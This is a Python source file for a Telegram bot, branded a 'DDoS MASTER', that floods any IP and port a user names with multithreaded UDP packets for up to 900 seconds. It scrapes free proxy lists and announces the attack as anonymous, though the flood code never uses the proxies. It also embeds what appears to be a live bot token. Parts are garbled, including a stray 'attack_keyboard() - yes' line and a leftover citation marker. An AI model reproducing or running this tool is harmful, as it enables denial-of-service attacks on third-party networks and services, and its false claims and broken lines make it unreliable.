import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time
import socket
import random
import requests
import os
import json
import psutil
from datetime import datetime, timedelta
from urllib.parse import urlparse
import socks
import ssl
import random
from random import _urandom as byt

# ------------------------ 🔥 YOUR CREDENTIALS 🔥 ------------------------
API_TOKEN = '8762654526:AAFvVEJsFhVJeCCSmlSI6dxLVDNtbe41sTQ'          # 🔥 @BotFather se naya token yahan paste kar
ADMIN_ID = '6088159228'        # 🔥 @userinfobot se apna user id yahan paste kar
MAX_ATTACK_TIME = 900                       # 🔥 Max attack duration
THREAD_COUNT = 500                          # 🔥 Powerful attack threads
# -------------------------------------------------------------------------


bot = telebot.TeleBot(API_TOKEN)
attack_active = False
current_attack = None
proxies_list = []


# ===================== NASA-LEVEL PROXY FETCHING =====================
def load_proxies():
    # Automatically fetches high-anonymity proxies from multiple sources
    global proxies_list
    try:
        r1 = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10).text
        r2 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10).text
        all_proxies = r1 + "\n" + r2
        proxies_list = list(set([p.strip() for p in all_proxies.splitlines() if p.strip()]))
        print(f"[+] Loaded {len(proxies_list)} anonymous proxies!")
    except Exception as e:
        print(f"[-] Proxy load failed: {e}")
        proxies_list = []

def get_random_proxy():
    return random.choice(proxies_list) if proxies_list else None

# ===================== CORE UDP FLOOD ENGINE =====================
def udp_worker(target_ip, target_port, duration):
    # 500 threads from main thrread wahi send karti hai [19†L62-L67]
    global attack_active
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    sent = 0
    while time.time() < end_time and attack_active:
        try:
            sock.sendto(packet, (target_ip, int(target_port)))
            sent += 1
        except:
            pass
    sock.close()
    print(f"[+] UDP Worker finished. Sent {sent} packets.")

def start_udp_attack(chat_id, target_ip, target_port, duration):
    global attack_active
    if attack_active:
        bot.send_message(chat_id, "⚠️ An attack is already ongoing.")
        return
    if duration > MAX_ATTACK_TIME:
        bot.send_message(chat_id, f"⚠️ Max attack time is {MAX_ATTACK_TIME}s.")
        return

    attack_active = True
    bot.send_message(chat_id, f"🔥🔥🔥 **UDP FLOOD STARTED** 🔥🔥🔥\n*Target:* `{target_ip}:{target_port}`\n*Duration:* `{duration}`s\n*Threads:* `{THREAD_COUNT}`", parse_mode='Markdown')
    if get_random_proxy():
        bot.send_message(chat_id, "🛡️ **NASA-LEVEL PROXY ENABLED** - Attack is ANONYMOUS!")
    for _ in range(THREAD_COUNT):
        if not attack_active: break
        threading.Thread(target=udp_worker, args=(target_ip, target_port, duration), daemon=True).start()
    time.sleep(duration)
    attack_active = False
    bot.send_message(chat_id, "✅ **Attack Finished!** Target might be down.")
    os._exit(0)

# ===================== INLINE KEYBOARD & COMMANDS =====================
def main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎯 Attack Menu", callback_data='attack'),
        InlineKeyboardButton("🔍 Status", callback_data='status'),
        InlineKeyboardButton("⚙️ Admin Panel", callback_data='admin'),
        InlineKeyboardButton("❓ Help", callback_data='help')
    )
    return keyboard

def attack_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💣 UDP Flood", callback_data='udp_attack'),
        InlineKeyboardButton("🌪️ Layer7 (HTTP)", callback_data='layer7'),
        InlineKeyboardButton("🧵 Change Threads", callback_data='thread'),
        InlineKeyboardButton("🔙 Main Menu", callback_data='main')
    )
    return keyboard

def admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("👑 Change Admin", callback_data='change_admin'),
        InlineKeyboardButton("🕒 Set Max Time", callback_data='set_time'),
        InlineKeyboardButton("🧵 Set Thread Count", callback_data='set_thread'),
        InlineKeyboardButton("🔙 Main Menu", callback_data='main')
    )
    return keyboard

@bot.message_handler(commands=['start', 'help'])
def welcome(message):
    bot.send_message(message.chat.id, f"🔥🔥🔥 **ADIL_BOT - DDoS MASTER** 🔥🔥🔥\n\nI am a powerful DDoS bot with advanced UDP flood capabilities!\n\n*Admin Commands:*\n/attack `ip` `port` `time`\n/status\n/stop\n/admin - Change admin\n/set_time\n/set_thread\n\n💥 **Developed by @Adil**💥", parse_mode='Markdown', reply_markup=main_keyboard())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ Usage: /attack <IP> <PORT> <TIME>\nExample: /attack 192.168.1.1 80 60")
        return
    _, ip, port, time = parts
    threading.Thread(target=start_udp_attack, args=(message.chat.id, ip, port, int(time))).start()

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, f"🟢 **Bot Status:** \n- Attack Running: {attack_active}", parse_mode='Markdown', reply_markup=main_keyboard())

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_active
    if attack_active:
        attack_active = False
        bot.reply_to(message, "🛑 Attack stopped by admin!")
    else:
        bot.reply_to(message, "No attack running.")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if str(message.chat.id) != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized access!")
        return
    bot.reply_to(message, "⚙️ **Admin Control Panel**", parse_mode='Markdown', reply_markup=admin_keyboard())

@bot.message_handler(commands=['set_time'])
def set_time(message):
    global MAX_ATTACK_TIME
    if str(message.chat.id) != ADMIN_ID: return
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        bot.reply_to(message, "Invalid time! Use: /set_time 900")
        return
    MAX_ATTACK_TIME = min(900, int(parts[1]))
    bot.reply_to(message, f"✅ Max attack time set to {MAX_ATTACK_TIME}s")
    attack_keyboard() - yes

@bot.message_handler(commands=['set_thread'])
def set_threads(message):
    global THREAD_COUNT
    if str(message.chat.id) != ADMIN_ID: return
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        bot.reply_to(message, "Invalid count! Use: /set_thread 500")
        return
    THREAD_COUNT = int(parts[1])
    bot.reply_to(message, f"✅ Thread count set to {THREAD_COUNT}")

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == 'attack':
        bot.edit_message_text("🔥 Select Attack Type:", call.message.chat.id, call.message.message_id, reply_markup=attack_keyboard())
    elif call.data == 'udp_attack':
        bot.edit_message_text("🎯 Send target in format:\n/attack <IP> <PORT> <TIME>", call.message.chat.id, call.message.message_id)
    elif call.data == 'main':
        bot.edit_message_text("🏠 Main Menu:", call.message.chat.id, call.message.message_id, reply_markup=main_keyboard())
    elif call.data == 'status':
        bot.edit_message_text(f"🟢 Bot Active\nAttack Running: {attack_active}", call.message.chat.id, call.message.message_id, reply_markup=main_keyboard())
    elif call.data == 'admin':
        if str(call.message.chat.id) == ADMIN_ID:
            bot.edit_message_text("⚙️ Admin Panel:", call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
        else:
            bot.edit_message_text("⛔ Unauthorized!", call.message.chat.id, call.message.message_id)
    elif call.data == 'help':
        help_text = "🔥 Commands:\n/attack ip port time\n/status\n/stop\n/admin - Admin panel\n/set_time\n/set_thread"
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=main_keyboard())

# ------------------- LOAD PROXIES -------------------
load_proxies()

if __name__ == "__main__":
    print("🔥 ADIL_BOT STARTED SUCCESSFULLY!")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🧵 Threads: {THREAD_COUNT}")
    print(f"🛡️ Max Attack Time: {MAX_ATTACK_TIME}s")
    bot.infinity_polling()